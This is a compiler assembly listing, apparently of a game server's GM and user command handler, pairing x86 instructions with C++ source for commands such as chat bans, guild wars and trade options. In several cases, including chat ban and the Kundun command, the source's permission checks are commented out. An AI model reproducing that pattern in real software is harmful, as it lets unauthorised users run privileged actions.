  01e8f	e8 00 00 00 00	 call	 ?GCServerMsgStringSendGuild@@YAXPAU_GUILD_INFO_STRUCT@@PADE@Z ; GCServerMsgStringSendGuild
  01e94	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2846 : 						GCServerMsgStringSendGuild(gObj[aIndex].lpGuild->lpTargetGuildNode, szTemp, 1);

  01e97	6a 01		 push	 1
  01e99	8d 85 98 fa ff
	ff		 lea	 eax, DWORD PTR _szTemp$78[ebp]
  01e9f	50		 push	 eax
  01ea0	69 4d 10 a0 1b
	00 00		 imul	 ecx, DWORD PTR _aIndex$[ebp], 7072
  01ea7	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01ead	8b 84 0a 94 02
	00 00		 mov	 eax, DWORD PTR [edx+ecx+660]
  01eb4	8b 88 8c 05 00
	00		 mov	 ecx, DWORD PTR [eax+1420]
  01eba	51		 push	 ecx
  01ebb	e8 00 00 00 00	 call	 ?GCServerMsgStringSendGuild@@YAXPAU_GUILD_INFO_STRUCT@@PADE@Z ; GCServerMsgStringSendGuild
  01ec0	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN173@Management:

; 2847 : 					}
; 2848 : 				}
; 2849 : 			}			
; 2850 : 		}
; 2851 : 		break;

  01ec3	e9 f4 1d 00 00	 jmp	 $LN2@Management

; 2852 : 	//------------------------------------------------------------------------
; 2853 : 	//  
; 2854 : 	case GMCMD_COPYCHAR	: 
; 2855 : 		break;

  01ec8	e9 ef 1d 00 00	 jmp	 $LN2@Management

; 2856 : 	//------------------------------------------------------------------------
; 2857 : 	//  
; 2858 : 	case GMCMD_ACCOUNTBLOCK : 
; 2859 : 		/*if( (lpObj->AuthorityCode&AUTHORITY_CODE_ACCOUNTBLOCK) != AUTHORITY_CODE_ACCOUNTBLOCK) return 0;
; 2860 : 		pId = GetTokenString();
; 2861 : 		{
; 2862 : 		int aIndex = gObjGetIndex(pId);
; 2863 : 		if( aIndex >= 0 )
; 2864 : 		{
; 2865 : 			GJPAccountBlock(aIndex, gObj[aIndex].AccountID, gObj[aIndex].DBNumber,  gObj[aIndex].UserNumber, 1);
; 2866 : 		}
; 2867 : 		}*/
; 2868 : 		break;

  01ecd	e9 ea 1d 00 00	 jmp	 $LN2@Management

; 2869 : 	//------------------------------------------------------------------------
; 2870 : 	//   
; 2871 : 	case GMCMD_ACCOUNTBLOCKFREE : 
; 2872 : 		/*if( (lpObj->AuthorityCode&AUTHORITY_CODE_ACCOUNTBLOCK) != AUTHORITY_CODE_ACCOUNTBLOCK) return 0;
; 2873 : 		pId = GetTokenString();
; 2874 : 		{
; 2875 : 		int aIndex = gObjGetIndex(pId);
; 2876 : 		if( aIndex >= 0 )
; 2877 : 		{
; 2878 : 			GJPAccountBlock(aIndex, gObj[aIndex].AccountID, gObj[aIndex].DBNumber,  gObj[aIndex].UserNumber, 0);
; 2879 : 		}
; 2880 : 		}*/
; 2881 : 		break;

  01ed2	e9 e5 1d 00 00	 jmp	 $LN2@Management
$LN177@Management:

; 2882 : 	//------------------------------------------------------------------------
; 2883 : 	//  
; 2884 : 	case GMCMD_CHATBAN :
; 2885 : //		if( (lpObj->AuthorityCode&AUTHORITY_CODE_CHATBAN) != AUTHORITY_CODE_CHATBAN) return 0;
; 2886 : 
; 2887 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2888 : 		LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  01ed7	68 00 00 00 00	 push	 OFFSET ??_C@_0N@KILIGKJC@Ban?5Chatting@
  01edc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01edf	83 c0 73	 add	 eax, 115		; 00000073H
  01ee2	50		 push	 eax
  01ee3	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01ee6	83 c1 68	 add	 ecx, 104		; 00000068H
  01ee9	51		 push	 ecx
  01eea	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01eed	83 c2 18	 add	 edx, 24			; 00000018H
  01ef0	52		 push	 edx
  01ef1	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01ef6	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01efc	83 c4 14	 add	 esp, 20			; 00000014H

; 2889 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "Ban Chatting");
; 2890 : 	#endif
; 2891 : 		pId = GetTokenString();

  01eff	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01f02	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  01f07	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2892 : 		
; 2893 : 		if( pId == NULL ) return 0;

  01f0d	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  01f14	75 07		 jne	 SHORT $LN178@Management
  01f16	33 c0		 xor	 eax, eax
  01f18	e9 a1 1d 00 00	 jmp	 $LN1@Management
$LN178@Management:

; 2894 : 
; 2895 : 		{
; 2896 : 		int aIndex = gObjGetIndex(pId);

  01f1d	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01f23	50		 push	 eax
  01f24	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  01f29	83 c4 04	 add	 esp, 4
  01f2c	89 85 94 fa ff
	ff		 mov	 DWORD PTR _aIndex$77[ebp], eax

; 2897 : 		if( aIndex >= 0 )

  01f32	83 bd 94 fa ff
	ff 00		 cmp	 DWORD PTR _aIndex$77[ebp], 0
  01f39	7c 31		 jl	 SHORT $LN179@Management

; 2898 : 		{
; 2899 : 			gObj[aIndex].Penalty |= CTLCODE_CHATBAN;

  01f3b	69 85 94 fa ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _aIndex$77[ebp], 7072
  01f45	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01f4b	8b 94 01 a8 01
	00 00		 mov	 edx, DWORD PTR [ecx+eax+424]
  01f52	83 ca 02	 or	 edx, 2
  01f55	69 85 94 fa ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _aIndex$77[ebp], 7072
  01f5f	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01f65	89 94 01 a8 01
	00 00		 mov	 DWORD PTR [ecx+eax+424], edx
$LN179@Management:

; 2900 : 		}
; 2901 : 		}
; 2902 : 		break;	

  01f6c	e9 4b 1d 00 00	 jmp	 $LN2@Management
$LN180@Management:

; 2903 : 	//------------------------------------------------------------------------
; 2904 : 	//   
; 2905 : 	case GMCMD_CHATBANFREE :
; 2906 : //		if( (lpObj->AuthorityCode&AUTHORITY_CODE_CHATBAN) != AUTHORITY_CODE_CHATBAN) return 0;
; 2907 : 
; 2908 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2909 : 		LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  01f71	68 00 00 00 00	 push	 OFFSET ??_C@_0BC@MOJFCJJN@Free?5Ban?9Chatting@
  01f76	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01f79	83 c0 73	 add	 eax, 115		; 00000073H
  01f7c	50		 push	 eax
  01f7d	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01f80	83 c1 68	 add	 ecx, 104		; 00000068H
  01f83	51		 push	 ecx
  01f84	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01f87	83 c2 18	 add	 edx, 24			; 00000018H
  01f8a	52		 push	 edx
  01f8b	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01f90	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01f96	83 c4 14	 add	 esp, 20			; 00000014H

; 2910 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "Free Ban-Chatting");
; 2911 : 	#endif
; 2912 : 		pId = GetTokenString();

  01f99	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01f9c	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  01fa1	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2913 : 
; 2914 : 		if( pId == NULL ) return 0;

  01fa7	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  01fae	75 07		 jne	 SHORT $LN181@Management
  01fb0	33 c0		 xor	 eax, eax
  01fb2	e9 07 1d 00 00	 jmp	 $LN1@Management
$LN181@Management:

; 2915 : 
; 2916 : 		{
; 2917 : 		int aIndex = gObjGetIndex(pId);

  01fb7	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01fbd	50		 push	 eax
  01fbe	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  01fc3	83 c4 04	 add	 esp, 4
  01fc6	89 85 90 fa ff
	ff		 mov	 DWORD PTR _aIndex$76[ebp], eax

; 2918 : 		if( aIndex >= 0 )

  01fcc	83 bd 90 fa ff
	ff 00		 cmp	 DWORD PTR _aIndex$76[ebp], 0
  01fd3	7c 31		 jl	 SHORT $LN182@Management

; 2919 : 		{
; 2920 : 			gObj[aIndex].Penalty &= (~CTLCODE_CHATBAN);

  01fd5	69 85 90 fa ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _aIndex$76[ebp], 7072
  01fdf	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01fe5	8b 94 01 a8 01
	00 00		 mov	 edx, DWORD PTR [ecx+eax+424]
  01fec	83 e2 fd	 and	 edx, -3			; fffffffdH
  01fef	69 85 90 fa ff
	ff a0 1b 00 00	 imul	 eax, DWORD PTR _aIndex$76[ebp], 7072
  01ff9	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01fff	89 94 01 a8 01
	00 00		 mov	 DWORD PTR [ecx+eax+424], edx
$LN182@Management:

; 2921 : 		}
; 2922 : 		}
; 2923 : 		break;

  02006	e9 b1 1c 00 00	 jmp	 $LN2@Management
$LN183@Management:

; 2924 : 		
; 2925 : 	//------------------------------------------------------------------------
; 2926 : 	//  
; 2927 : 	case UMCMD_GUILDWAR :
; 2928 : 		pId = GetTokenString();

  0200b	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0200e	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  02013	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2929 : 		if( pId != NULL ) 

  02019	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  02020	74 29		 je	 SHORT $LN185@Management

; 2930 : 		{
; 2931 : 			if( strlen(pId) >= 1 ) GCGuildWarRequestResult(pId, aIndex, 0);

  02022	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  02028	50		 push	 eax
  02029	e8 00 00 00 00	 call	 _strlen
  0202e	83 c4 04	 add	 esp, 4
  02031	83 f8 01	 cmp	 eax, 1
  02034	72 15		 jb	 SHORT $LN185@Management
  02036	6a 00		 push	 0
  02038	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  0203b	50		 push	 eax
  0203c	8b 8d cc fe ff
	ff		 mov	 ecx, DWORD PTR _pId$[ebp]
  02042	51		 push	 ecx
  02043	e8 00 00 00 00	 call	 ?GCGuildWarRequestResult@@YAXPADHH@Z ; GCGuildWarRequestResult
  02048	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN185@Management:

; 2932 : 		}
; 2933 : 		break;

  0204b	e9 6c 1c 00 00	 jmp	 $LN2@Management
$LN186@Management:

; 2934 : 	//------------------------------------------------------------------------
; 2935 : 	//   
; 2936 : 	case UMCMD_BATTLESOCCERWAR :
; 2937 : 		if( (lpObj->Authority&AUTHORITY_ADMIN) == AUTHORITY_ADMIN ) 

  02050	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02053	8b 88 a4 01 00
	00		 mov	 ecx, DWORD PTR [eax+420]
  02059	83 e1 02	 and	 ecx, 2
  0205c	0f 84 98 00 00
	00		 je	 $LN187@Management

; 2938 : 		{
; 2939 : 		#ifdef ADD_LOG_GM_COMMAND_20040420
; 2940 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  02062	68 00 00 00 00	 push	 OFFSET ??_C@_0N@KELDLAKD@Set?5GuildWar@
  02067	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0206a	83 c0 73	 add	 eax, 115		; 00000073H
  0206d	50		 push	 eax
  0206e	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02071	83 c1 68	 add	 ecx, 104		; 00000068H
  02074	51		 push	 ecx
  02075	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02078	83 c2 18	 add	 edx, 24			; 00000018H
  0207b	52		 push	 edx
  0207c	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  02081	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  02087	83 c4 14	 add	 esp, 20			; 00000014H

; 2941 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "Set GuildWar");
; 2942 : 		#endif
; 2943 : 			char *pId2;
; 2944 : 
; 2945 : 			pId = GetTokenString();

  0208a	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0208d	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  02092	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2946 : 			if( pId != NULL ) 

  02098	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  0209f	74 57		 je	 SHORT $LN191@Management

; 2947 : 			{
; 2948 : 				pId2 = GetTokenString();

  020a1	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  020a4	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  020a9	89 85 8c fa ff
	ff		 mov	 DWORD PTR _pId2$75[ebp], eax

; 2949 : 				if( pId2 != NULL )

  020af	83 bd 8c fa ff
	ff 00		 cmp	 DWORD PTR _pId2$75[ebp], 0
  020b6	74 40		 je	 SHORT $LN191@Management

; 2950 : 				{
; 2951 : 					if( strlen(pId) >= 1 && strlen(pId2) >= 1 ) 

  020b8	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  020be	50		 push	 eax
  020bf	e8 00 00 00 00	 call	 _strlen
  020c4	83 c4 04	 add	 esp, 4
  020c7	83 f8 01	 cmp	 eax, 1
  020ca	72 2c		 jb	 SHORT $LN191@Management
  020cc	8b 85 8c fa ff
	ff		 mov	 eax, DWORD PTR _pId2$75[ebp]
  020d2	50		 push	 eax
  020d3	e8 00 00 00 00	 call	 _strlen
  020d8	83 c4 04	 add	 esp, 4
  020db	83 f8 01	 cmp	 eax, 1
  020de	72 18		 jb	 SHORT $LN191@Management

; 2952 : 					{
; 2953 : 						GCManagerGuildWarSet(pId, pId2, 1);

  020e0	6a 01		 push	 1
  020e2	8b 85 8c fa ff
	ff		 mov	 eax, DWORD PTR _pId2$75[ebp]
  020e8	50		 push	 eax
  020e9	8b 8d cc fe ff
	ff		 mov	 ecx, DWORD PTR _pId$[ebp]
  020ef	51		 push	 ecx
  020f0	e8 00 00 00 00	 call	 ?GCManagerGuildWarSet@@YAXPAD0H@Z ; GCManagerGuildWarSet
  020f5	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN191@Management:

; 2954 : 					}
; 2955 : 				}
; 2956 : 			}
; 2957 : 		}

  020f8	eb 49		 jmp	 SHORT $LN194@Management
$LN187@Management:

; 2958 : 		else
; 2959 : 		{
; 2960 : 			if( gEnableBattleSoccer )

  020fa	83 3d 00 00 00
	00 00		 cmp	 DWORD PTR ?gEnableBattleSoccer@@3HA, 0 ; gEnableBattleSoccer
  02101	74 40		 je	 SHORT $LN194@Management

; 2961 : 			{
; 2962 : 				pId = GetTokenString();

  02103	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02106	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0210b	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2963 : 				if( pId != NULL ) 

  02111	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  02118	74 29		 je	 SHORT $LN194@Management

; 2964 : 				{
; 2965 : 					if( strlen(pId) >= 1 ) GCGuildWarRequestResult(pId, aIndex, 1);

  0211a	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  02120	50		 push	 eax
  02121	e8 00 00 00 00	 call	 _strlen
  02126	83 c4 04	 add	 esp, 4
  02129	83 f8 01	 cmp	 eax, 1
  0212c	72 15		 jb	 SHORT $LN194@Management
  0212e	6a 01		 push	 1
  02130	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  02133	50		 push	 eax
  02134	8b 8d cc fe ff
	ff		 mov	 ecx, DWORD PTR _pId$[ebp]
  0213a	51		 push	 ecx
  0213b	e8 00 00 00 00	 call	 ?GCGuildWarRequestResult@@YAXPADHH@Z ; GCGuildWarRequestResult
  02140	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN194@Management:

; 2966 : 				}
; 2967 : 			}
; 2968 : 		}
; 2969 : 		break;

  02143	e9 74 1b 00 00	 jmp	 $LN2@Management
$LN195@Management:

; 2970 : 	//------------------------------------------------------------------------
; 2971 : 	// /   
; 2972 : 	case UMCMD_BILLCHECK :
; 2973 : 		gObjBillRequest(&gObj[aIndex]);

  02148	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  0214f	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  02155	50		 push	 eax
  02156	e8 00 00 00 00	 call	 ?gObjBillRequest@@YAXPAVOBJECTSTRUCT@@@Z ; gObjBillRequest
  0215b	83 c4 04	 add	 esp, 4

; 2974 : 
; 2975 : 		if(CheckAuthority(AUTHORITY_SUPER_ADMIN, &gObj[aIndex]) == false) break;

  0215e	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  02165	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0216b	50		 push	 eax
  0216c	6a 40		 push	 64			; 00000040H
  0216e	e8 00 00 00 00	 call	 ?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z ; CheckAuthority
  02173	83 c4 08	 add	 esp, 8
  02176	0f b6 c8	 movzx	 ecx, al
  02179	85 c9		 test	 ecx, ecx
  0217b	75 05		 jne	 SHORT $LN196@Management
  0217d	e9 3a 1b 00 00	 jmp	 $LN2@Management
$LN196@Management:

; 2976 : 		
; 2977 : #ifdef VTM_PLAYTIME_LIMIT_SYSTEM_20060626
; 2978 : // #if (TESTSERVER == 1) || defined(FOR_TEMP_SERVER)
; 2979 : 		if( g_bVtmPlayTimeLimitOn == TRUE )
; 2980 : 		{
; 2981 : 			INT iCalcRestTime = (g_iVtmPlayTimeLimitLevel2Time*60)-gObj[aIndex].m_iPlayRestTime;
; 2982 : 
; 2983 : 			if (iCalcRestTime < 0)	
; 2984 : 				iCalcRestTime = 0;
; 2985 : 
; 2986 : 			PMSG_NOTICE	pNotice;
; 2987 : 			CHAR szNotice[256] = {0,};
; 2988 : 			TNotice::SetNoticeProperty(&pNotice, TNOTICE_TYPE_BOTTOM, TNOTICE_COLOR_DEFAULT);
; 2989 : 
; 2990 : 			wsprintf(szNotice, "PlayTime(%02d:%02d), To ResetTime(%02d:%02d)",					
; 2991 : 				gObj[aIndex].m_iPlayTimeLimit/(60*60),	
; 2992 : 				(gObj[aIndex].m_iPlayTimeLimit%(60*60))/60,
; 2993 : 				iCalcRestTime/(60*60),
; 2994 : 				(iCalcRestTime%(60*60))/60
; 2995 : 				);
; 2996 : 
; 2997 : 			TNotice::MakeNoticeMsgEx( &pNotice, TNOTICE_TYPE_BOTTOM, szNotice );
; 2998 : 			TNotice::SendNoticeToUser( aIndex, &pNotice );
; 2999 : 		}
; 3000 : // #endif // TESTSERVER == 1
; 3001 : #endif // VTM_PLAYTIME_LIMIT_SYSTEM_20060626
; 3002 : 		
; 3003 : 		break;	

  02182	e9 35 1b 00 00	 jmp	 $LN2@Management
$LN197@Management:

; 3004 : 	
; 3005 : 	case UMCMD_TRADEOPTION :
; 3006 : 		{
; 3007 : 		int op;
; 3008 : 		pId = GetTokenString();

  02187	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0218a	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0218f	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 3009 : 		if( pId != NULL )

  02195	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  0219c	74 7e		 je	 SHORT $LN202@Management

; 3010 : 		{
; 3011 : 			if( strcmp(pId, "on")==0) op = 1;

  0219e	68 00 00 00 00	 push	 OFFSET ??_C@_02LIELOMNJ@on@
  021a3	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  021a9	50		 push	 eax
  021aa	e8 00 00 00 00	 call	 _strcmp
  021af	83 c4 08	 add	 esp, 8
  021b2	85 c0		 test	 eax, eax
  021b4	75 0c		 jne	 SHORT $LN199@Management
  021b6	c7 85 88 fa ff
	ff 01 00 00 00	 mov	 DWORD PTR _op$74[ebp], 1
  021c0	eb 22		 jmp	 SHORT $LN201@Management
$LN199@Management:

; 3012 : 			else if( strcmp(pId, "off")==0) op = 0;

  021c2	68 00 00 00 00	 push	 OFFSET ??_C@_03MCADLMAF@off@
  021c7	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  021cd	50		 push	 eax
  021ce	e8 00 00 00 00	 call	 _strcmp
  021d3	83 c4 08	 add	 esp, 8
  021d6	85 c0		 test	 eax, eax
  021d8	75 0a		 jne	 SHORT $LN201@Management
  021da	c7 85 88 fa ff
	ff 00 00 00 00	 mov	 DWORD PTR _op$74[ebp], 0
$LN201@Management:

; 3013 : 			if( op >= 0 && op <= 1 )

  021e4	83 bd 88 fa ff
	ff 00		 cmp	 DWORD PTR _op$74[ebp], 0
  021eb	7c 2f		 jl	 SHORT $LN202@Management
  021ed	83 bd 88 fa ff
	ff 01		 cmp	 DWORD PTR _op$74[ebp], 1
  021f4	7f 26		 jg	 SHORT $LN202@Management

; 3014 : 			{
; 3015 : 				gObjSetTradeOption(aIndex, op);

  021f6	8b 85 88 fa ff
	ff		 mov	 eax, DWORD PTR _op$74[ebp]
  021fc	50		 push	 eax
  021fd	8b 4d 10	 mov	 ecx, DWORD PTR _aIndex$[ebp]
  02200	51		 push	 ecx
  02201	e8 00 00 00 00	 call	 ?gObjSetTradeOption@@YAXHH@Z ; gObjSetTradeOption
  02206	83 c4 08	 add	 esp, 8

; 3016 : #ifdef DUEL_SYSTEM_20031028				
; 3017 : 				gObjSetDuelOption(aIndex, op);

  02209	8b 85 88 fa ff
	ff		 mov	 eax, DWORD PTR _op$74[ebp]
  0220f	50		 push	 eax
  02210	8b 4d 10	 mov	 ecx, DWORD PTR _aIndex$[ebp]
  02213	51		 push	 ecx
  02214	e8 00 00 00 00	 call	 ?gObjSetDuelOption@@YAXHH@Z ; gObjSetDuelOption
  02219	83 c4 08	 add	 esp, 8
$LN202@Management:

; 3018 : #endif
; 3019 : 			}
; 3020 : 		}
; 3021 : 		}
; 3022 : 		break;

  0221c	e9 9b 1a 00 00	 jmp	 $LN2@Management
$LN203@Management:

; 3023 : 
; 3024 : 
; 3025 : #ifdef ADD_KUNDUN_CONTROL_20040923
; 3026 : 	//------------------------------------------------------------------------
; 3027 : 	//   
; 3028 : 	case GMCMD_NOTIFYKUNDUNHP :
; 3029 : 		{
; 3030 : /*
; 3031 : #if (TESTSERVER==0)
; 3032 : 			if( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN ) 
; 3033 : 				return 0;
; 3034 : #endif
; 3035 : */
; 3036 : 
; 3037 : #ifdef ADD_LOG_GM_COMMAND_20040420
; 3038 : 			LogAddTD( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  02221	68 00 00 00 00	 push	 OFFSET ??_C@_0N@DFKMJHLF@?D?o?$LF?P?$LL?s?E?B?$LK?$LI?$LB?b@
  02226	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02229	83 c0 73	 add	 eax, 115		; 00000073H
  0222c	50		 push	 eax
  0222d	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02230	83 c1 68	 add	 ecx, 104		; 00000068H
  02233	51		 push	 ecx
  02234	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02237	83 c2 18	 add	 edx, 24			; 00000018H
  0223a	52		 push	 edx
  0223b	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  02240	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  02246	83 c4 14	 add	 esp, 20			; 00000014H

; 3039 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "");
; 3040 : 
; 3041 : 			KUNDUN_GM_LOG.Output( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  02249	68 00 00 00 00	 push	 OFFSET ??_C@_0N@DFKMJHLF@?D?o?$LF?P?$LL?s?E?B?$LK?$LI?$LB?b@
  0224e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02251	83 c0 73	 add	 eax, 115		; 00000073H
  02254	50		 push	 eax
  02255	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02258	83 c1 68	 add	 ecx, 104		; 00000068H
  0225b	51		 push	 ecx
  0225c	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0225f	83 c2 18	 add	 edx, 24			; 00000018H
  02262	52		 push	 edx
  02263	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  02268	68 00 00 00 00	 push	 OFFSET ?KUNDUN_GM_LOG@@3VCLogToFile@@A ; KUNDUN_GM_LOG
  0226d	e8 00 00 00 00	 call	 ?Output@CLogToFile@@QAAXPADZZ ; CLogToFile::Output
  02272	83 c4 18	 add	 esp, 24			; 00000018H

; 3042 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "" );
; 3043 : #endif
; 3044 : 
; 3045 : 			for( int count=0; count < MAXVIEWPORTOBJECT; count++ )

  02275	c7 85 84 fa ff
	ff 00 00 00 00	 mov	 DWORD PTR _count$73[ebp], 0
  0227f	eb 0f		 jmp	 SHORT $LN45@Management
$LN43@Management:
  02281	8b 85 84 fa ff
	ff		 mov	 eax, DWORD PTR _count$73[ebp]
  02287	83 c0 01	 add	 eax, 1
  0228a	89 85 84 fa ff
	ff		 mov	 DWORD PTR _count$73[ebp], eax
$LN45@Management:
  02290	83 bd 84 fa ff
	ff 4b		 cmp	 DWORD PTR _count$73[ebp], 75 ; 0000004bH
  02297	0f 8d 12 01 00
	00		 jge	 $LN44@Management

; 3046 : 			{
; 3047 : 				if( lpObj->VpPlayer[count].state )

  0229d	6b 85 84 fa ff
	ff 0c		 imul	 eax, DWORD PTR _count$73[ebp], 12
  022a4	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  022a7	0f be 94 01 64
	03 00 00	 movsx	 edx, BYTE PTR [ecx+eax+868]
  022af	85 d2		 test	 edx, edx
  022b1	0f 84 f3 00 00
	00		 je	 $LN207@Management

; 3048 : 				{
; 3049 : 					if( lpObj->VpPlayer[count].type == OBJTYPE_MONSTER )

  022b7	6b 85 84 fa ff
	ff 0c		 imul	 eax, DWORD PTR _count$73[ebp], 12
  022be	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  022c1	0f b6 94 01 68
	03 00 00	 movzx	 edx, BYTE PTR [ecx+eax+872]
  022c9	83 fa 02	 cmp	 edx, 2
  022cc	0f 85 d8 00 00
	00		 jne	 $LN207@Management

; 3050 : 					{
; 3051 : 						if( lpObj->VpPlayer[count].number >= 0 )

  022d2	6b 85 84 fa ff
	ff 0c		 imul	 eax, DWORD PTR _count$73[ebp], 12
